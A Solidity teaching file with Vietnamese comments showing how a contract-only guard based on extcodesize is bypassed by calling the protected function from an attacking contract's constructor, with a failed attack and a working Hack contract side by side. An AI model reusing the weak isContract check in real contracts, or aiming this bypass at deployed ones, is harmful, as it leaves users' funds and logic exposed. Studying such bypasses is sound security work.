// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

// # Bảo mật Sol / isContract bypass

// Nhiều contract họ dùng hàm protected như dưới để bảo vệ contract bằng cách: k cho bất cứ contract nào tương tác với contract này mà chỉ cho người dùng. Bên trong isContract ta cx làm đúng tiêu chuẩn là code size phải là 0 thì là người chứ kp contract => Tuy nhiên ta vẫn có thể bypass được nó
// VD dùng protected để cản DenialOfService vì 1 contract cho hàm fallback assert, nhưng người dùng thì luôn nhận được.
contract Target {
    function isContract(address account) public view returns (bool) {
        uint size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0; // codesize là 0 thì k là contract
    }
    bool public pwned = false;
    function protected() external {
        require(!isContract(msg.sender), "no contract allowed");
        pwned = true;
    }
}

contract FailedAttack {
    function pwn(address _target) external {
        // This will fail
        Target(_target).protected();
    }
}

contract Hack {
    bool public isContract;

    // When contract is being created, code size (extcodesize) is 0.
    constructor(address _target) {
        isContract = Target(_target).isContract(address(this));
        // This will work
        Target(_target).protected();
    }
}
// Tức là hàm isContract theo tiêu chuẩn của openzeppelin nếu ta gọi constructor của 1 contract khác thì codesize vẫn là 0 và nó k coi đó là 1 contract (mà coi là 1 địa chỉ bth vì hàm constructor chưa kết thúc thì contract chưa được tạo ra). Đây là 1 TH ngoại lệ rằng vẫn có thể bypass hàm isContract và gọi 1 hàm số từ constructor của contract khác